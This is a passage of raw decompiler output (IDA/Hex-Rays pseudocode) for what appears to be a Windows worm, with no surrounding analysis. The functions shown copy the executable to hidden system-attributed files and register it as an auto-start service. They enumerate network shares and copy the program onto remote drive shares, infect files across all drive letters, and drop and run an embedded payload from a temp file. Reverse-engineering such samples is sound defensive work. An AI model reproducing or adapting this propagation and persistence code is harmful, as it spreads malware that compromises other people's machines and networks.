      sub_4034E0(aS, (char *)0xFFFFFFFF, 4096);
    }
  }
  return 1;
}

//----- (00406552) --------------------------------------------------------
int sub_406552()
{
  char *v0; // eax
  int result; // eax
  char *v2; // eax
  int v3; // [esp+10h] [ebp-204h]
  char Buffer[512]; // [esp+14h] [ebp-200h] BYREF

  v3 = 1;
  while ( 1 )
  {
    Data[0] = 0;
    byte_4931D0[0] = 0;
    sprintf(Buffer, "%s%08d", aOyyUS_0, v3);
    v0 = sub_40347E(aOyyUS_0, 1);
    result = sub_4045EF(HKEY_CURRENT_USER, Buffer, v0, Data, (HKEY)0x104);
    if ( Data[0] )
    {
      v2 = sub_40347E(aOyyUS_0, 2);
      result = sub_4045EF(HKEY_CURRENT_USER, Buffer, v2, byte_4931D0, (HKEY)0x104);
      if ( byte_4931D0[0] )
        break;
    }
    if ( ++v3 > 9 )
    {
      Data[0] = 0;
      byte_4931D0[0] = 0;
      return result;
    }
  }
  return result;
}
// 4931D0: using guessed type BYTE byte_4931D0[260];
// 4932D4: using guessed type BYTE Data[260];

//----- (00406608) --------------------------------------------------------
DWORD __stdcall sub_406608(LPVOID lpThreadParameter)
{
  unsigned int v2; // eax
  char *v3; // eax
  bool v4; // zf
  int v5; // edx
  char *v6; // edi
  int v7; // eax
  int v8; // edx
  char *v9; // eax
  unsigned int v10; // eax
  char *v11; // eax
  char Str[8828]; // [esp+Ch] [ebp-3020h] BYREF
  char v13[300]; // [esp+2288h] [ebp-DA4h] BYREF
  CHAR Filename[260]; // [esp+23B4h] [ebp-C78h] BYREF
  char v15[2340]; // [esp+24B8h] [ebp-B74h] BYREF
  char v16[300]; // [esp+2DDCh] [ebp-250h] BYREF
  CHAR NewFileName[260]; // [esp+2F08h] [ebp-124h] BYREF
  int v18; // [esp+300Ch] [ebp-20h]
  char *Source; // [esp+3010h] [ebp-1Ch]
  int i; // [esp+3014h] [ebp-18h]
  char *v21; // [esp+3018h] [ebp-14h]
  int v22; // [esp+301Ch] [ebp-10h]
  unsigned int v23; // [esp+3020h] [ebp-Ch]
  int v24; // [esp+3024h] [ebp-8h]
  int v25; // [esp+3028h] [ebp-4h]

  v21 = (char *)operator new(0x100000u);
  if ( v21 )
  {
    while ( !sub_40542A() )
      Sleep(0xEA60u);
    sub_405C2E(dword_4933D8, 512000);
    sub_406106(1);
    sub_406552();
    GetModuleFileNameA(0, Filename, 0x104u);
    sub_403E97(NewFileName);
    v24 = 0;
    while ( 1 )
    {
      while ( !sub_40542A() )
        Sleep(0xEA60u);
      if ( !sub_403E63(NewFileName) )
      {
        CopyFileA(Filename, NewFileName, 0);
        SetFileAttributesA(NewFileName, 0x20u);
        sub_404FC5(NewFileName, 86016);
        v2 = sub_4047B6(0);
        sub_40406E(NewFileName, v2 % 0x2800 + 86528);
      }
      for ( i = sub_4034AE(dword_4933D8, 0); v24 < i; ++v24 )
      {
        memcpy(Str, &String1, 0x227Au);
        Str[4116] = 0;
        sub_405705(NewFileName, Str);
        memset(v15, 0, sizeof(v15));
        v3 = sub_40347E(dword_4933D8, v24);
        v4 = *v3 == 0;
        Source = v3;
        if ( !v4 )
        {
          strcpy(&v15[100], v3);
          v5 = sub_4047B6(0) % (unsigned int)i;
          if ( v5 == v24 )
            ++v5;
          if ( v5 >= i )
            v5 = 0;
          v6 = sub_40347E(dword_4933D8, v5);
          if ( !*v6 )
            v6 = sub_40347E(dword_4933D8, 0);
          strcpy(&v15[1452], NewFileName);
          strcpy(&v15[200], v6);
          strcpy(v15, v6);
          if ( !sub_40620B(v15, v21, 1) )
          {
            memset(v15, 0, sizeof(v15));
            strcpy(&v15[1452], NewFileName);
            strcpy(&v15[200], v6);
            strcpy(v15, v6);
            strcpy(&v15[100], Source);
            if ( sub_4062F0(v15, v21, 1) )
            {
              sub_406426(v6);
            }
            else
            {
              v7 = sub_4034AE(aS, 0);
              v18 = -1;
              v23 = v7;
              v22 = 0;
              do
              {
                memset(v15, 0, sizeof(v15));
                strcpy(&v15[1452], NewFileName);
                strcpy(&v15[200], v6);
                strcpy(&v15[100], Source);
                v8 = sub_4047B6(0) % v23;
                v25 = v8;
                if ( v8 == v18 )
                  v25 = ++v8;
                if ( v8 >= (int)v23 )
                  v25 = 0;
                v9 = sub_40347E(aS, v25);
                strcpy(v15, v9);
                if ( sub_4062F0(v15, v21, 1) )
                  break;
                ++v22;
                v18 = v25;
              }
              while ( v22 < 6 );
              if ( v22 >= 6 )
              {
                v23 = sub_4034AE(aUzm, 0);
                v10 = sub_4047B6(0);
                v25 = v10 % v23;
                if ( (int)(v10 % v23) >= (int)v23 )
                  v25 = 0;
                sub_403BB8((int)v6, (int)v16, v13);
                strcat(v16, Str2);
                v11 = sub_40347E(aUzm, v25);
                strcat(v16, v11);
                memset(v15, 0, sizeof(v15));
                strcpy(&v15[1452], NewFileName);
                strcpy(&v15[200], v6);
                strcpy(&v15[100], Source);
                strcpy(v15, v16);
                sub_4062F0(v15, v21, 1);
              }
            }
          }
        }
      }
      Sleep(0x927C0u);
    }
  }
  return 0;
}
// 406608: using guessed type char var_DA4[300];

//----- (00406A36) --------------------------------------------------------
const char *__cdecl sub_406A36(LPCCH lpMultiByteStr, int a2)
{
  const char *result; // eax
  char v3; // al
  char Source[260]; // [esp+8h] [ebp-560h] BYREF
  struct HKEY__ phkResult; // [esp+10Ch] [ebp-45Ch] BYREF
  char v6[260]; // [esp+210h] [ebp-358h] BYREF
  CHAR FileName[260]; // [esp+314h] [ebp-254h] BYREF
  WCHAR v8[52]; // [esp+418h] [ebp-150h] BYREF
  WCHAR WideCharStr[32]; // [esp+480h] [ebp-E8h] BYREF
  WCHAR v10[20]; // [esp+4C0h] [ebp-A8h] BYREF
  CHAR Buffer[32]; // [esp+4E8h] [ebp-80h] BYREF
  CHAR Destination[2]; // [esp+508h] [ebp-60h] BYREF
  char v13[28]; // [esp+50Ah] [ebp-5Eh] BYREF
  __int16 v14; // [esp+526h] [ebp-42h]
  int v15[8]; // [esp+528h] [ebp-40h] BYREF
  DWORD nSize; // [esp+548h] [ebp-20h] BYREF
  CHAR MultiByteStr[4]; // [esp+54Ch] [ebp-1Ch] BYREF
  int v18; // [esp+550h] [ebp-18h]
  __int16 v19; // [esp+554h] [ebp-14h]
  const char *v20; // [esp+558h] [ebp-10h]
  int v21; // [esp+55Ch] [ebp-Ch] BYREF
  const char *v22; // [esp+560h] [ebp-8h]
  int i; // [esp+564h] [ebp-4h]

  strcpy(Destination, "x");
  memset(v13, 0, sizeof(v13));
  v14 = 0;
  strcpy(MultiByteStr, "a:\\");
  result = 0;
  v18 = 0;
  v19 = 0;
  nSize = 32;
  v21 = 0;
  v22 = 0;
  if ( !dword_4938F0 )
  {
    if ( dword_493908 )
    {
      if ( !lpMultiByteStr
        || (GetComputerNameA(Buffer, &nSize), (result = (const char *)_strcmpi(lpMultiByteStr + 2, Buffer)) != 0) )
      {
        v15[4] = -1;
        v15[6] = (int)v10;
        v15[0] = (int)v8;
        v15[2] = (int)v8;
        v15[1] = 0;
        v15[5] = 0;
        v15[7] = 0;
        v15[3] = 127;
        strcat(Destination, Buffer);
        MultiByteToWideChar(0, 1u, lpMultiByteStr, -1, WideCharStr, 34);
        for ( i = 2; i < 5; ++i )
        {
          MultiByteStr[0] = i + 65;
          MultiByteToWideChar(0, 1u, MultiByteStr, -1, v10, 20);
          Destination[0] = MultiByteStr[0];
          MultiByteToWideChar(0, 1u, Destination, -1, v8, 52);
          result = (const char *)dword_493908(WideCharStr, 2, v15, &v21);
          v20 = result;
          if ( a2 )
          {
            if ( !result && !v22 )
            {
              v3 = sub_4047B6(0);
              sub_404261((char *)&phkResult, v3 & 1, &byte_4101DC, 1);
              strcpy(v6, asc_40F044);
              strcat(v6, Destination);
              result = (const char *)sub_40284D(lpMultiByteStr, v6, 0, &phkResult, 0, 1);
              v22 = result;
            }
            if ( !v20 )
            {
              sub_404261(Source, 0, &String2, 1);
              strcpy(FileName, lpMultiByteStr);
              strcat(FileName, asc_40F044);
              strcat(FileName, Destination);
              strcat(FileName, asc_40F044);
              strcat(FileName, Source);
              result = sub_40704C(FileName, -1, -1, 1);
            }
          }
        }
      }
    }
  }
  return result;
}
// 4938F0: using guessed type int dword_4938F0;
// 493908: using guessed type int (__stdcall *dword_493908)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00406C65) --------------------------------------------------------
int __cdecl sub_406C65(LPNETRESOURCEA lpNetResource, DWORD dwScope, int a3)
{
  int result; // eax
  const char **v4; // esi
  char v5; // al
  char v6; // al
  char Buffer[20]; // [esp+4h] [ebp-439Ch] BYREF
  char v8; // [esp+18h] [ebp-4388h] BYREF
  struct HKEY__ phkResult; // [esp+3E84h] [ebp-51Ch] BYREF
  char Source[260]; // [esp+3F88h] [ebp-418h] BYREF
  char v11[260]; // [esp+408Ch] [ebp-314h] BYREF
  CHAR MachineName[260]; // [esp+4190h] [ebp-210h] BYREF
  char Destination[260]; // [esp+4294h] [ebp-10Ch] BYREF
  DWORD BufferSize; // [esp+4398h] [ebp-8h] BYREF
  DWORD cCount; // [esp+439Ch] [ebp-4h] BYREF
  LPNETRESOURCEA lpNetResourcea; // [esp+43A8h] [ebp+8h]

  cCount = -1;
  BufferSize = 16000;
  result = WNetOpenEnumA(dwScope, 1u, 3u, lpNetResource, (LPHANDLE)&dwScope);
  if ( !result )
  {
    WNetEnumResourceA((HANDLE)dwScope, &cCount, Buffer, &BufferSize);
    lpNetResourcea = 0;
    if ( cCount )
    {
      v4 = (const char **)&v8;
      do
      {
        if ( (*(_BYTE *)(v4 - 2) & 2) != 0 )
        {
          sub_406C65((LPNETRESOURCEA)(v4 - 5), 2u, a3);
        }
        else if ( !sub_404BD2((int)*v4, MachineName, v11) )
        {
          sub_406A36(MachineName, a3);
          v5 = sub_4047B6(0);
          sub_404261((char *)&phkResult, v5 & 1, &byte_4101DC, 1);
          if ( a3 )
          {
            sub_40284D(MachineName, v11, 0, &phkResult, 0, 1);
            v6 = sub_4047B6(0);
            sub_404261(Source, v6 & 1, &String2, 1);
            strcpy(Destination, *v4);
            strcat(Destination, asc_40F044);
            strcat(Destination, Source);
            sub_40704C(Destination, -1, -1, 1);
          }
        }
        lpNetResourcea = (LPNETRESOURCEA)((char *)lpNetResourcea + 1);
        v4 += 8;
      }
      while ( (unsigned int)lpNetResourcea < cCount );
    }
    return WNetCloseEnum((HANDLE)dwScope);
  }
  return result;
}
// 406C65: using guessed type char Buffer[20];

//----- (00406DDE) --------------------------------------------------------
void __stdcall __noreturn sub_406DDE(LPVOID lpThreadParameter)
{
  int i; // eax

  for ( i = 1; ; i = 0 )
  {
    sub_406C65(0, 2u, i);
    Sleep(0x6DDD00u);
  }
}

//----- (00406DFD) --------------------------------------------------------
int sub_406DFD()
{
  unsigned int v0; // eax
  char *v1; // eax
  HMODULE LibraryA; // ebp
  FARPROC ProcAddress; // eax
  SC_HANDLE v5; // ebp
  SC_HANDLE v6; // edi
  SC_HANDLE hSCObject; // [esp+10h] [ebp-2384h]
  SC_HANDLE hSCObjecta; // [esp+10h] [ebp-2384h]
  CHAR Filename[260]; // [esp+14h] [ebp-2380h] BYREF
  char Str[8828]; // [esp+118h] [ebp-227Ch] BYREF

  GetModuleFileNameA(0, Filename, 0x104u);
  SetFileAttributesA((LPCSTR)&ApplicationName, 0x20u);
  hSCObject = (SC_HANDLE)CopyFileA(Filename, (LPCSTR)&ApplicationName, 0);
  SetFileAttributesA((LPCSTR)&ApplicationName, 0x20u);
  if ( hSCObject )
  {
    memcpy(Str, &String1, 0x227Au);
    Str[4116] = 0;
    sub_405705((LPCSTR)&ApplicationName, Str);
    sub_404FC5((LPCSTR)&ApplicationName, 86016);
    v0 = sub_4047B6(0);
    sub_40406E((LPCSTR)&ApplicationName, v0 % 0x2800 + 86528);
  }
  sub_405522((LPCSTR)&ApplicationName);
  SetFileAttributesA((LPCSTR)&ApplicationName, 0x27u);
  if ( dword_4938F0 )
  {
    sub_40464B(HKEY_LOCAL_MACHINE, Destination, ServiceName, &ApplicationName);
    v1 = sub_40347E(LibFileName, 1);
    LibraryA = LoadLibraryA(v1);
    ProcAddress = GetProcAddress(LibraryA, ProcName);
    if ( ProcAddress )
      ((void (__stdcall *)(_DWORD, int))ProcAddress)(0, 1);
    FreeLibrary(LibraryA);
  }
  if ( !hSCObject )
    return 0;
  if ( dword_4938F0 )
  {
    sub_4047E2((LPCSTR)&ApplicationName, 0);
  }
  else if ( !dword_4938F8 )
  {
    hSCObjecta = OpenSCManagerA(0, 0, 2u);
    CreateServiceA(hSCObjecta, ServiceName, ServiceName, 0, 0x110u, 2u, 0, (LPCSTR)&ApplicationName, 0, 0, 0, 0, 0);
    CloseServiceHandle(hSCObjecta);
    v5 = OpenSCManagerA(0, 0, 1u);
    v6 = OpenServiceA(v5, ServiceName, 0x10u);
    StartServiceA(v6, 0, 0);
    CloseServiceHandle(v6);
    CloseServiceHandle(v5);
  }
  return 1;
}
// 4938F0: using guessed type int dword_4938F0;
// 4938F8: using guessed type int dword_4938F8;

//----- (00406F88) --------------------------------------------------------
DWORD __stdcall sub_406F88(LPVOID lpThreadParameter)
{
  UINT DriveTypeA; // eax
  CHAR RootPathName[4]; // [esp+0h] [ebp-4h] BYREF

  strcpy(RootPathName, "a:\\");
  RootPathName[0] = (_BYTE)lpThreadParameter + dword_4128F0;
  DriveTypeA = GetDriveTypeA(RootPathName);
  if ( DriveTypeA == 3 || DriveTypeA == 4 )
  {
    while ( 1 )
    {
      sub_403F1C(RootPathName, (int)sub_405C7A, 0);
      Sleep(0x1B77400u);
    }
  }
  return 1;
}
// 4128F0: using guessed type int dword_4128F0;

//----- (00406FD5) --------------------------------------------------------
DWORD __stdcall sub_406FD5(LPVOID lpThreadParameter)
{
  char *v1; // eax
  char Source[300]; // [esp+4h] [ebp-258h] BYREF
  char Destination[300]; // [esp+130h] [ebp-12Ch] BYREF

  strcpy(Destination, SubKey);
  v1 = sub_40347E(SubKey, 7);
  strcat(Destination, v1);
  Source[0] = 0;
  sub_4045EF(HKEY_LOCAL_MACHINE, Destination, byte_410DF0, (LPBYTE)Source, (HKEY)0x12C);
  sub_403F1C(Source, (int)sub_405C7A, 0);
  return 0;
}

//----- (0040704C) --------------------------------------------------------
const char *__cdecl sub_40704C(LPCSTR lpFileName, int a2, int a3, int a4)
{
  const char *result; // eax
  unsigned int v6; // eax
  char *v7; // eax
  char *v8; // eax
  char Str[8828]; // [esp+10h] [ebp-2590h] BYREF
  CHAR Filename[260]; // [esp+228Ch] [ebp-314h] BYREF
  char Destination[260]; // [esp+2390h] [ebp-210h] BYREF
  CHAR NewFileName[260]; // [esp+2494h] [ebp-10Ch] BYREF
  int v13; // [esp+2598h] [ebp-8h]
  int v14; // [esp+259Ch] [ebp-4h]
  unsigned int v15; // [esp+25ACh] [ebp+Ch]
  unsigned int v16; // [esp+25ACh] [ebp+Ch]

  v14 = a2;
  v13 = a3;
  if ( a4 || (result = sub_404825(lpFileName)) == 0 )
  {
    v15 = sub_4034AE(aU_1, 0);
    if ( a2 < 0 )
      v14 = sub_4047B6(0) % v15;
    v16 = sub_4034AE(&byte_4101DC, 0);
    if ( a3 < 0 )
      v13 = sub_4047B6(0) % v16;
    sub_403E97(NewFileName);
    GetModuleFileNameA(0, Filename, 0x104u);
    result = (const char *)CopyFileA(Filename, NewFileName, 0);
    if ( result )
    {
      SetFileAttributesA(NewFileName, 0x20u);
      memcpy(Str, &String1, 0x227Au);
      Str[4116] = 0;
      sub_405705(NewFileName, Str);
      v6 = sub_4047B6(0);
      sub_40406E(NewFileName, v6 % 0x2800 + 86528);
      v7 = sub_40347E(aU_1, v14);
      strcpy(Destination, v7);
      v8 = sub_40347E(&byte_4101DC, v13);
      strcat(Destination, v8);
      sub_405226(lpFileName, NewFileName, Destination, a4);
      return (const char *)sub_403F05(NewFileName);
    }
  }
  return result;
}

//----- (004071C3) --------------------------------------------------------
void __noreturn sub_4071C3()
{
  while ( 1 )
    Sleep(0xFFFFFFFF);
}

//----- (004071CD) --------------------------------------------------------
DWORD __stdcall sub_4071CD(LPVOID lpThreadParameter)
{
  char *v1; // eax
  signed int v2; // eax
  _BYTE *v3; // esi
  HANDLE v4; // eax
  CHAR PathName[260]; // [esp+0h] [ebp-220h] BYREF
  char TempFileName[260]; // [esp+104h] [ebp-11Ch] BYREF
  CHAR PrefixString[20]; // [esp+208h] [ebp-18h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+21Ch] [ebp-4h] BYREF

  sub_40372F(PrefixString, 2, 5, 4);
  PathName[0] = 0;
  v1 = sub_40347E(aOtor, 1);
  sub_4045EF(HKEY_LOCAL_MACHINE, SubKey, v1, (LPBYTE)PathName, (HKEY)0x104);
  GetTempFileNameA(PathName, PrefixString, 0, TempFileName);
  sub_403F05(TempFileName);
  v2 = strlen(TempFileName);
  do
    --v2;
  while ( v2 >= 0 && TempFileName[v2] != 46 );
  if ( v2 > 0 )
    strcpy(&TempFileName[v2], &byte_4101DC);
  v3 = sub_40756C(dword_411340, 0x15A6u, &nNumberOfBytesToWrite);
  if ( !sub_403DC6(TempFileName, v3, nNumberOfBytesToWrite) )
  {
    sub_403E97(TempFileName);
    sub_403DC6(TempFileName, v3, nNumberOfBytesToWrite);
  }
  v4 = sub_4047E2(TempFileName, 0);
  if ( v4 )
  {
    WaitForSingleObject(v4, 0xFFFFFFFF);
    sub_403F05(TempFileName);
  }
  return 0;
}
// 411340: using guessed type int dword_411340[1386];
// 4071CD: using guessed type CHAR TempFileName[260];

//----- (004072F2) --------------------------------------------------------
void __noreturn sub_4072F2()
{
  int i; // ebx
  DWORD ThreadId; // [esp+Ch] [ebp-4h] BYREF

  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_406608, 0, 0, &ThreadId);
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_406DDE, 0, 0, &ThreadId);
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_406066, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_4071CD, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_406FD5, 0, 0, &ThreadId);
  for ( i = 0; i < 26; ++i )
    CreateThread(0, 0, sub_406F88, (LPVOID)i, 0, &ThreadId);
  sub_4071C3();
}

//----- (0040737C) --------------------------------------------------------
void __stdcall HandlerProc(DWORD dwControl)
{
  struct _SERVICE_STATUS ServiceStatus; // [esp+0h] [ebp-1Ch] BYREF

  ServiceStatus.dwServiceType = 272;
  memset(&ServiceStatus.dwControlsAccepted, 0, 20);
  ServiceStatus.dwCurrentState = 4;
  SetServiceStatus(hServiceStatus, &ServiceStatus);
  if ( sub_404C49() )
    sub_4072F2();
}

//----- (004073C3) --------------------------------------------------------
void __stdcall sub_4073C3(int a1, int a2)
{
  hServiceStatus = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);
  HandlerProc(0);
}

//----- (004073E2) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  struct WSAData WSAData; // [esp+0h] [ebp-1A0h] BYREF
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+190h] [ebp-10h] BYREF
  int v7; // [esp+198h] [ebp-8h]
  int v8; // [esp+19Ch] [ebp-4h]

  WSAStartup(2u, &WSAData);
  if ( sub_4055FE() )
  {
    sub_406DFD();
    if ( !byte_4100D4 || !sub_405B0F(&byte_4100D4) )
    {
      if ( dword_4938F8 )
      {
        v7 = 0;
        v8 = 0;
        ServiceStartTable.lpServiceName = ServiceName;
        ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_4073C3;
        StartServiceCtrlDispatcherA(&ServiceStartTable);
      }
      if ( sub_404C49() )
        sub_4072F2();
    }
  }
  return 0;
}
// 4938F8: using guessed type int dword_4938F8;

//----- (0040745D) --------------------------------------------------------
unsigned int *__cdecl sub_40745D(int a1, size_t a2, int a3)
{
  void *v3; // ebx
  size_t v4; // esi
  size_t v6; // eax
  char *v7; // edi
  char v8; // cl
  size_t v9; // ecx
  unsigned int *v10; // esi
  size_t v11; // edi
  size_t v12; // ebx
  char Src[80000]; // [esp+8h] [ebp-1388Ch] BYREF
  void *v14; // [esp+13888h] [ebp-Ch]
  unsigned int v15; // [esp+1388Ch] [ebp-8h]
  size_t Size; // [esp+13890h] [ebp-4h]

  v3 = operator new(a2);
  v4 = 0;
  v14 = v3;
  v15 = 0;
  Size = 0;
  if ( !v3 )
    return 0;
  memset(Src, 0, sizeof(Src));
  v6 = 0;
  v7 = &Src[4];
  while ( v6 < a2 )
  {
    do
    {
      v8 = *(_BYTE *)(v6 + a1);
      if ( !v8 )
        break;
      *((_BYTE *)v3 + v4++) = v8;
      ++v6;
      Size = v4;
    }
    while ( v6 < a2 );
    if ( v6 >= a2 )
      break;
    v9 = v6;
    do
    {
      if ( *(_BYTE *)(v9 + a1) )
        break;
      ++v9;
    }
    while ( v9 < a2 );
    if ( v9 - v6 >= 0xA )
    {
      if ( v15 >= 0x2710 )
      {
        Size = v4;
        v10 = 0;
        goto LABEL_18;
      }
      ++v15;
      *((_DWORD *)v7 - 1) = v6;
      *(_DWORD *)v7 = v9 - v6;
      v7 += 8;
      v6 = v9;
    }
    else
    {
      while ( v6 < v9 )
      {
        *((_BYTE *)v3 + v4++) = *(_BYTE *)(v6 + a1);
        ++v6;
      }
    }
  }
  Size = v4;
  v11 = 2 * v15;
  v12 = 8 * v15 + v4 + 4;
  v10 = (unsigned int *)operator new(v12);
  *v10 = v15;
  memcpy(v10 + 1, Src, v11 * 4);
  memcpy(&v10[v11 + 1], v14, Size);
  *(_DWORD *)a3 = v12;
  v3 = v14;
LABEL_18:
  operator delete(v3);
  return v10;
}

//----- (0040756C) --------------------------------------------------------
_BYTE *__cdecl sub_40756C(int *a1, unsigned int a2, size_t *a3)
{
  size_t v4; // edx
  unsigned int v5; // edi
  _BYTE *result; // eax
  int *v7; // esi
  size_t v8; // ecx
  int v9; // eax
  unsigned int v10; // esi
  int *v11; // edi
  int v12; // ebx
  int *v13; // ecx
  unsigned int i; // edx
  unsigned int v15; // ecx
  _BYTE *v16; // esi
  int *v17; // [esp+Ch] [ebp-Ch]
  int v18; // [esp+10h] [ebp-8h]
  unsigned int v19; // [esp+14h] [ebp-4h]
  unsigned int v20; // [esp+14h] [ebp-4h]
  int v21; // [esp+20h] [ebp+8h]
  unsigned int v22; // [esp+24h] [ebp+Ch]

  v4 = 0;
  v5 = 8 * *a1;
  v19 = 0;
  v17 = a1 + 1;
  v18 = *a1;
  if ( a2 < v5 + 4 )
    return 0;
  if ( *a1 )
  {
    v7 = a1 + 1;
    v21 = *a1;
    do
    {
      if ( v4 < *v7 )
      {
        v8 = *v7 - v4;
        v4 = *v7;
        v19 += v8;
      }
      v9 = v7[1];
      if ( v9 )
        v4 += v9;
      v7 += 2;
      --v21;
    }
    while ( v21 );
  }
  v22 = a2 - v5 - 4;
  if ( v19 < v22 )
    v4 += v22 - v19;
  v10 = 0;
  v20 = 0;
  *a3 = v4;
  result = operator new(v4);
  v11 = &a1[v5 / 4 + 1];
  v12 = v18;
  if ( v18 )
  {
    v13 = v17;
    do
    {
      while ( v10 < *v13 )
        result[v10++] = *((_BYTE *)v11 + v20++);
      for ( i = 0; i < v13[1]; ++i )
        result[v10++] = 0;
      v13 += 2;
      --v12;
    }
    while ( v12 );
  }
  v15 = v20;
  if ( v20 < v22 )
  {
    v16 = &result[v10];
    do
      *v16++ = *((_BYTE *)v11 + v15++);
    while ( v15 < v22 );
  }
  return result;
}

//----- (00407F35) --------------------------------------------------------
int __cdecl sub_407F35(int a1)
{
  int result; // eax

  result = a1;
  dword_412900 = a1;
  return result;
}
// 412900: using guessed type int dword_412900;

//----- (0040C3AB) --------------------------------------------------------
int sub_40C3AB()
{
  return flsall(1);
}
// 40C3B4: using guessed type _DWORD __cdecl flsall(_DWORD);

// nfuncs=263 queued=134 decompiled=134 lumina nreq=0 worse=0 better=0
// ALL OK, 134 function(s) have been successfully decompiled
